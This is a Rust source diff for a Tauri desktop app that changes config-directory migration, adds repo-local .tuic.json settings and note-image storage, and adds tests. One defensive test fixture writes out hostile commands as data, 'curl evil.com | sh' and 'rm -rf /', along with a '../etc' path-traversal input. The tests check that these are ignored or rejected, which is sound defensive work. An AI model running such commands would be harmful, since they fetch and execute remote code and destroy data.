@@ -22,37 +22,44 @@ pub(crate) fn set_config_dir_override(dir: PathBuf) -> impl Drop {
 
 /// Get the config directory using platform-appropriate location.
 ///
-/// - macOS: `~/Library/Application Support/tuicommander/`
-/// - Linux: `~/.config/tuicommander/` (or `$XDG_CONFIG_HOME`)
-/// - Windows: `%APPDATA%/tuicommander/`
+/// - macOS: `~/Library/Application Support/com.tuic.commander/`
+/// - Linux: `~/.config/com.tuic.commander/` (or `$XDG_CONFIG_HOME`)
+/// - Windows: `%APPDATA%/com.tuic.commander/`
 ///
+/// Matches Tauri's `$APPCONFIG` path (derived from the bundle identifier).
 /// Falls back to `~/.tuicommander/` if platform dir is unavailable.
 /// On first call, migrates from legacy locations if the new dir doesn't exist:
-///   1. `~/.tui-commander/` (legacy dotdir)
-///   2. `{platform_config}/tui-commander/` (old platform-dir name)
+///   1. `{platform_config}/tuicommander/` (previous custom name)
+///   2. `{platform_config}/tui-commander/` (older name)
+///   3. `~/.tuicommander/` (legacy dotdir)
 pub(crate) fn config_dir() -> PathBuf {
     #[cfg(test)]
     if let Some(dir) = CONFIG_DIR_OVERRIDE.lock().unwrap().clone() {
         return dir;
     }
     let new_dir = dirs::config_dir()
-        .map(|d| d.join("tuicommander"))
+        .map(|d| d.join("com.tuic.commander"))
         .unwrap_or_else(legacy_dotdir);
 
-    if !new_dir.exists() {
-        // Try migrating from old platform dir (tui-commander) first, then legacy dotdir
-        let old_platform_dir = dirs::config_dir().map(|d| d.join("tui-commander"));
-        let legacy_dot = legacy_dotdir();
+    // Migrate if our config file is missing (the dir may already exist from Tauri's window-state plugin)
+    if !new_dir.join(APP_CONFIG_FILE).exists() {
+        // Try migrating from legacy dirs (newest first): tuicommander, tui-commander, ~/.tuicommander
+        let platform_dir = dirs::config_dir();
+        let candidates = [
+            platform_dir.as_ref().map(|d| d.join("tuicommander")),
+            platform_dir.as_ref().map(|d| d.join("tui-commander")),
+            Some(legacy_dotdir()),
+        ];
 
-        let source = old_platform_dir
-            .filter(|d| d.exists())
-            .unwrap_or(legacy_dot);
+        let source = candidates.into_iter().flatten().find(|d| d.exists());
 
-        if source.exists() && source != new_dir
-            && let Err(e) = migrate_config_dir(&source, &new_dir)
-        {
-            eprintln!("Warning: config migration failed: {e}");
-            return source;
+        if let Some(source) = source {
+            if source != new_dir {
+                if let Err(e) = migrate_config_dir(&source, &new_dir) {
+                    tracing::warn!("Config migration failed: {e}");
+                    return source;
+                }
+            }
         }
     }
 
@@ -88,11 +95,7 @@ fn migrate_config_dir(from: &std::path::Path, to: &std::path::Path) -> Result<()
         }
     }
 
-    eprintln!(
-        "Migrated config from {} to {}",
-        from.display(),
-        to.display()
-    );
+    tracing::info!(from = %from.display(), to = %to.display(), "Migrated config directory");
     Ok(())
 }
 
@@ -130,14 +133,14 @@ pub(crate) fn load_json_config<T: DeserializeOwned + Default>(filename: &str) ->
     let content = match std::fs::read_to_string(&path) {
         Ok(s) => s,
         Err(e) => {
-            eprintln!("Warning: Could not read config {}: {e}", path.display());
+            tracing::warn!(path = %path.display(), "Could not read config: {e}");
             return T::default();
         }
     };
     match serde_json::from_str(&content) {
         Ok(v) => v,
         Err(e) => {
-            eprintln!("Error: Corrupt config {}: {e}. Using defaults.", path.display());
+            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
             T::default()
         }
     }
@@ -311,7 +314,7 @@ pub(crate) struct AppConfig {
     /// Plugin IDs that the user has disabled (not loaded on startup)
     #[serde(default)]
     pub(crate) disabled_plugin_ids: Vec<String>,
-    /// Update channel: "stable", "beta", or "nightly"
+    /// Update channel: "stable" or "nightly"
     #[serde(default = "default_update_channel")]
     pub(crate) update_channel: String,
     /// Session token cookie duration in seconds (0 = session cookie, 31536000 = "never")
@@ -496,6 +499,8 @@ pub(crate) struct UIPrefsConfig {
     pub(crate) file_browser_panel_visible: bool,
     #[serde(default)]
     pub(crate) plan_panel_visible: bool,
+    #[serde(default)]
+    pub(crate) git_panel_visible: bool,
     #[serde(default = "default_panel_width")]
     pub(crate) diff_panel_width: u32,
     #[serde(default = "default_panel_width")]
@@ -504,6 +509,8 @@ pub(crate) struct UIPrefsConfig {
     pub(crate) notes_panel_width: u32,
     #[serde(default = "default_plan_panel_width")]
     pub(crate) plan_panel_width: u32,
+    #[serde(default = "default_git_panel_width")]
+    pub(crate) git_panel_width: u32,
     #[serde(default = "default_settings_nav_width")]
     pub(crate) settings_nav_width: u32,
 }
@@ -518,10 +525,12 @@ impl Default for UIPrefsConfig {
             notes_panel_visible: false,
             file_browser_panel_visible: false,
             plan_panel_visible: false,
+            git_panel_visible: false,
             diff_panel_width: default_panel_width(),
             markdown_panel_width: default_panel_width(),
             notes_panel_width: default_notes_panel_width(),
             plan_panel_width: default_plan_panel_width(),
+            git_panel_width: default_git_panel_width(),
             settings_nav_width: default_settings_nav_width(),
         }
     }
@@ -531,7 +540,60 @@ fn default_sidebar_width() -> u32 { 260 }
 fn default_panel_width() -> u32 { 400 }
 fn default_notes_panel_width() -> u32 { 350 }
 fn default_plan_panel_width() -> u32 { 350 }
+fn default_git_panel_width() -> u32 { 380 }
 fn default_settings_nav_width() -> u32 { 180 }
+
+// ---------------------------------------------------------------------------
+// RepoLocalConfig — team-shareable settings loaded from .tuic.json in repo root
+// ---------------------------------------------------------------------------
+
+/// Settings loaded from `.tuic.json` at the repository root.
+/// These are team-shareable (committed to the repo) and override global defaults
+/// but are overridden by per-repo app settings.
+#[derive(Clone, Debug, Default, Serialize, Deserialize)]
+pub(crate) struct RepoLocalConfig {
+    #[serde(default)]
+    pub(crate) base_branch: Option<String>,
+    #[serde(default)]
+    pub(crate) copy_ignored_files: Option<bool>,
+    #[serde(default)]
+    pub(crate) copy_untracked_files: Option<bool>,
+    // Script fields (setup_script, run_script, archive_script) intentionally
+    // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
+    // Re-add when trust-on-first-use confirmation is implemented.
+    #[serde(default)]
+    pub(crate) worktree_storage: Option<WorktreeStorage>,
+    #[serde(default)]
+    pub(crate) delete_branch_on_remove: Option<bool>,
+    #[serde(default)]
+    pub(crate) auto_archive_merged: Option<bool>,
+    #[serde(default)]
+    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
+    #[serde(default)]
+    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
+    #[serde(default)]
+    pub(crate) after_merge: Option<WorktreeAfterMerge>,
+    #[serde(default)]
+    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
+}
+
+const REPO_LOCAL_CONFIG_FILE: &str = ".tuic.json";
+
+/// Load `.tuic.json` from a repository root.
+/// Returns `None` if the file doesn't exist or is malformed.
+pub(crate) fn load_repo_local_config_from_path(repo_path: &std::path::Path) -> Option<RepoLocalConfig> {
+    let path = repo_path.join(REPO_LOCAL_CONFIG_FILE);
+    match std::fs::read_to_string(&path) {
+        Ok(contents) => match serde_json::from_str::<RepoLocalConfig>(&contents) {
+            Ok(config) => Some(config),
+            Err(e) => {
+                tracing::warn!(path = %path.display(), "Malformed config: {e}");
+                None
+            }
+        },
+        Err(_) => None,
+    }
+}
 
 // ---------------------------------------------------------------------------
 // RepoSettingsMap — per-repo settings keyed by repo path
@@ -557,6 +619,9 @@ pub(crate) struct RepoSettingsEntry {
     /// null = inherit from global repo defaults
     #[serde(default)]
     pub(crate) run_script: Option<String>,
+    /// null = inherit from global repo defaults
+    #[serde(default)]
+    pub(crate) archive_script: Option<String>,
     #[serde(default)]
     pub(crate) color: String,
     // -- Worktree settings (null = inherit from global) --
@@ -590,6 +655,7 @@ impl RepoSettingsEntry {
             || self.copy_untracked_files.is_some()
             || self.setup_script.is_some()
             || self.run_script.is_some()
+            || self.archive_script.is_some()
             || !self.color.is_empty()
             || self.worktree_storage.is_some()
             || self.prompt_on_create.is_some()
@@ -616,6 +682,8 @@ pub(crate) struct RepoDefaultsConfig {
     pub(crate) setup_script: String,
     #[serde(default)]
     pub(crate) run_script: String,
+    #[serde(default)]
+    pub(crate) archive_script: String,
     // -- Worktree settings --
     #[serde(default)]
     pub(crate) worktree_storage: WorktreeStorage,
@@ -647,6 +715,7 @@ impl Default for RepoDefaultsConfig {
             copy_untracked_files: false,
             setup_script: String::new(),
             run_script: String::new(),
+            archive_script: String::new(),
             worktree_storage: WorktreeStorage::default(),
             prompt_on_create: true,
             delete_branch_on_remove: true,
@@ -786,6 +855,12 @@ pub(crate) fn check_has_custom_settings(path: String) -> bool {
     settings.repos.get(&path).is_some_and(|entry| entry.has_custom_settings())
 }
 
+// Repo local config (.tuic.json in repo root)
+#[tauri::command]
+pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfig> {
+    load_repo_local_config_from_path(std::path::Path::new(&repo_path))
+}
+
 // Repo defaults (global defaults for all repos)
 #[tauri::command]
 pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
@@ -864,6 +939,105 @@ pub(crate) fn save_agents_config(config: AgentsConfig) -> Result<(), String> {
 }
 
 // ---------------------------------------------------------------------------
+// Note images — save/delete/get for Ideas panel image attachments
+// ---------------------------------------------------------------------------
+
+const NOTE_IMAGES_DIR: &str = "note-images";
+
+/// Maximum decoded image size: 10 MB
+const MAX_IMAGE_SIZE: usize = 10 * 1024 * 1024;
+
+/// Validate a note ID to prevent path traversal attacks.
+/// Rejects IDs containing `/`, `\`, `..`, or null bytes.
+fn validate_note_id(note_id: &str) -> Result<(), String> {
+    if note_id.is_empty() {
+        return Err("note_id must not be empty".to_string());
+    }
+    if note_id.contains('/')
+        || note_id.contains('\\')
+        || note_id.contains("..")
+        || note_id.contains('\0')
+    {
+        return Err("note_id contains invalid characters".to_string());
+    }
+    Ok(())
+}
+
+/// Save a base64-encoded image to `config_dir()/note-images/<note_id>/<timestamp>.<extension>`.
+/// Returns the absolute path of the saved file.
+#[tauri::command]
+pub(crate) fn save_note_image(
+    note_id: String,
+    data_base64: String,
+    extension: String,
+) -> Result<String, String> {
+    use base64::{engine::general_purpose, Engine as _};
+
+    validate_note_id(&note_id)?;
+
+    let bytes = general_purpose::STANDARD
+        .decode(&data_base64)
+        .map_err(|e| format!("Invalid base64 data: {e}"))?;
+
+    if bytes.len() > MAX_IMAGE_SIZE {
+        return Err(format!(
+            "Image too large: {} bytes (max {} bytes)",
+            bytes.len(),
+            MAX_IMAGE_SIZE
+        ));
+    }
+
+    // Sanitize extension to alphanumeric only
+    let ext = extension
+        .chars()
+        .filter(|c| c.is_ascii_alphanumeric())
+        .collect::<String>();
+    let ext = if ext.is_empty() { "png".to_string() } else { ext };
+
+    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
+    std::fs::create_dir_all(&dir)
+        .map_err(|e| format!("Failed to create note-images dir: {e}"))?;
+
+    let filename = format!(
+        "{}.{}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis(),
+        ext
+    );
+    let path = dir.join(&filename);
+
+    std::fs::write(&path, &bytes)
+        .map_err(|e| format!("Failed to write image: {e}"))?;
+
+    Ok(path.to_string_lossy().to_string())
+}
+
+/// Delete all image assets for a note. No-op if the directory doesn't exist.
+#[tauri::command]
+pub(crate) fn delete_note_assets(note_id: String) -> Result<(), String> {
+    validate_note_id(&note_id)?;
+
+    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
+    if dir.exists() {
+        std::fs::remove_dir_all(&dir)
+            .map_err(|e| format!("Failed to delete note assets: {e}"))?;
+    }
+    Ok(())
+}
+
+/// Return the absolute path of the note-images root directory.
+/// The frontend needs this as `baseDir` for `convertFileSrc()`.
+#[tauri::command]
+pub(crate) fn get_note_images_dir() -> String {
+    config_dir()
+        .join(NOTE_IMAGES_DIR)
+        .to_string_lossy()
+        .to_string()
+}
+
+// ---------------------------------------------------------------------------
 // Tests
 // ---------------------------------------------------------------------------
 
@@ -913,7 +1087,7 @@ mod tests {
             auto_update_enabled: false,
             language: "it".to_string(),
             disabled_plugin_ids: vec!["test-disabled".to_string()],
-            update_channel: "beta".to_string(),
+            update_channel: "nightly".to_string(),
             session_token_duration_secs: 3600,
             ipv6_enabled: true,
             lan_auth_bypass: true,
@@ -945,7 +1119,7 @@ mod tests {
         assert!(!loaded.auto_update_enabled);
         assert_eq!(loaded.language, "it");
         assert_eq!(loaded.disabled_plugin_ids, vec!["test-disabled".to_string()]);
-        assert_eq!(loaded.update_channel, "beta");
+        assert_eq!(loaded.update_channel, "nightly");
         assert_eq!(loaded.session_token_duration_secs, 3600);
         assert!(loaded.ipv6_enabled);
         assert!(loaded.lan_auth_bypass);
@@ -1018,10 +1192,12 @@ mod tests {
             notes_panel_visible: false,
             file_browser_panel_visible: true,
             plan_panel_visible: false,
+            git_panel_visible: false,
             diff_panel_width: 500,
             markdown_panel_width: 450,
             notes_panel_width: 320,
             plan_panel_width: 350,
+            git_panel_width: 380,
             settings_nav_width: 200,
         };
         let loaded: UIPrefsConfig = round_trip_in_dir(dir.path(), "ui-prefs.json", &cfg);
@@ -1047,6 +1223,7 @@ mod tests {
                 copy_untracked_files: None,
                 setup_script: Some("npm install".to_string()),
                 run_script: Some("npm start".to_string()),
+                archive_script: Some("cleanup.sh".to_string()),
                 color: String::new(),
                 worktree_storage: None,
                 prompt_on_create: None,
@@ -1067,6 +1244,7 @@ mod tests {
         assert_eq!(entry.base_branch, Some("main".to_string()));
         assert_eq!(entry.copy_ignored_files, Some(true));
         assert_eq!(entry.copy_untracked_files, None);
+        assert_eq!(entry.archive_script, Some("cleanup.sh".to_string()));
     }
 
     #[test]
@@ -1190,6 +1368,15 @@ mod tests {
     fn has_custom_settings_true_when_run_script_set() {
         let entry = RepoSettingsEntry {
             run_script: Some("npm start".to_string()),
+            ..RepoSettingsEntry::default()
+        };
+        assert!(entry.has_custom_settings());
+    }
+
+    #[test]
+    fn has_custom_settings_true_when_archive_script_set() {
+        let entry = RepoSettingsEntry {
+            archive_script: Some("cleanup.sh".to_string()),
             ..RepoSettingsEntry::default()
         };
         assert!(entry.has_custom_settings());
@@ -1422,6 +1609,203 @@ mod tests {
             ..RepoSettingsEntry::default()
         };
         assert!(entry.has_custom_settings());
+    }
+
+    // -- Note image tests --
+    // These tests use the global config_dir override and must run serially.
+
+    #[test]
+    #[serial_test::serial]
+    fn save_note_image_creates_file() {
+        use base64::{engine::general_purpose, Engine as _};
+
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        // A minimal valid PNG (1x1 pixel)
+        let png_bytes: &[u8] = &[
+            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
+            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
+            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
+            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE,
+        ];
+        let b64 = general_purpose::STANDARD.encode(png_bytes);
+
+        let result = save_note_image("test-note-1".to_string(), b64, "png".to_string());
+        assert!(result.is_ok(), "save_note_image should succeed: {:?}", result);
+
+        let path = std::path::PathBuf::from(result.unwrap());
+        assert!(path.exists(), "Image file should exist on disk");
+        assert!(path.to_string_lossy().contains("note-images/test-note-1/"));
+        assert!(path.to_string_lossy().ends_with(".png"));
+
+        // Verify content matches
+        let saved = fs::read(&path).unwrap();
+        assert_eq!(saved, png_bytes);
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn save_note_image_rejects_oversized() {
+        use base64::{engine::general_purpose, Engine as _};
+
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        // Create data slightly over 10 MB
+        let big_data = vec![0u8; MAX_IMAGE_SIZE + 1];
+        let b64 = general_purpose::STANDARD.encode(&big_data);
+
+        let result = save_note_image("test-note-big".to_string(), b64, "png".to_string());
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("too large"));
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn save_note_image_rejects_invalid_base64() {
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        let result = save_note_image(
+            "test-note-bad".to_string(),
+            "not-valid-base64!!!@@@".to_string(),
+            "png".to_string(),
+        );
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("Invalid base64"));
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn save_note_image_rejects_path_traversal() {
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        let result = save_note_image("../etc".to_string(), "AAAA".to_string(), "png".to_string());
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("invalid characters"));
+
+        let result2 =
+            save_note_image("foo/bar".to_string(), "AAAA".to_string(), "png".to_string());
+        assert!(result2.is_err());
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn delete_note_assets_removes_directory() {
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        // Create a note-images dir with files
+        let note_dir = dir.path().join("note-images").join("note-to-delete");
+        fs::create_dir_all(&note_dir).unwrap();
+        fs::write(note_dir.join("img1.png"), b"fake-png").unwrap();
+        fs::write(note_dir.join("img2.png"), b"fake-png-2").unwrap();
+        assert!(note_dir.exists());
+
+        let result = delete_note_assets("note-to-delete".to_string());
+        assert!(result.is_ok());
+        assert!(!note_dir.exists(), "Directory should be removed");
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn delete_note_assets_noop_when_missing() {
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        let result = delete_note_assets("nonexistent-note".to_string());
+        assert!(result.is_ok(), "Should succeed even if dir doesn't exist");
+    }
+
+    #[test]
+    fn repo_local_config_loads_valid_json() {
+        let dir = TempDir::new().unwrap();
+        let json = r#"{
+            "base_branch": "develop",
+            "delete_branch_on_remove": false,
+            "pr_merge_strategy": "squash"
+        }"#;
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_some());
+        let config = config.unwrap();
+        assert_eq!(config.base_branch.as_deref(), Some("develop"));
+        assert_eq!(config.delete_branch_on_remove, Some(false));
+        assert_eq!(config.pr_merge_strategy, Some(MergeStrategy::Squash));
+        assert!(config.copy_ignored_files.is_none());
+    }
+
+    #[test]
+    fn repo_local_config_returns_none_when_missing() {
+        let dir = TempDir::new().unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_none());
+    }
+
+    #[test]
+    fn repo_local_config_returns_none_for_malformed_json() {
+        let dir = TempDir::new().unwrap();
+        fs::write(dir.path().join(".tuic.json"), "not valid json {{{").unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_none());
+    }
+
+    #[test]
+    fn repo_local_config_handles_empty_object() {
+        let dir = TempDir::new().unwrap();
+        fs::write(dir.path().join(".tuic.json"), "{}").unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_some());
+        let config = config.unwrap();
+        assert!(config.base_branch.is_none());
+    }
+
+    #[test]
+    fn repo_local_config_ignores_unknown_fields() {
+        let dir = TempDir::new().unwrap();
+        let json = r#"{"base_branch": "main", "unknown_field": 42}"#;
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_some());
+        assert_eq!(config.unwrap().base_branch.as_deref(), Some("main"));
+    }
+
+    #[test]
+    fn repo_local_config_ignores_script_fields() {
+        // Script fields (setup_script, run_script, archive_script) were intentionally
+        // removed from RepoLocalConfig to prevent executing repo-committed scripts
+        // without TOFU confirmation. Verify they are silently ignored.
+        let dir = TempDir::new().unwrap();
+        let json = r#"{
+            "base_branch": "develop",
+            "setup_script": "curl evil.com | sh",
+            "run_script": "rm -rf /",
+            "archive_script": "echo pwned"
+        }"#;
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_some(), "config should parse despite unknown script fields");
+        let config = config.unwrap();
+        assert_eq!(config.base_branch.as_deref(), Some("develop"));
+        // RepoLocalConfig has no script fields — they are silently dropped by serde
+        // No field to assert on; the fact that parsing succeeds without script
+        // fields on the struct is the security guarantee.
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn get_note_images_dir_returns_path() {
+        let dir = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(dir.path().to_path_buf());
+
+        let result = get_note_images_dir();
+        assert!(
+            result.ends_with("note-images"),
+            "Should end with note-images, got: {result}"
+        );
     }
 
 }
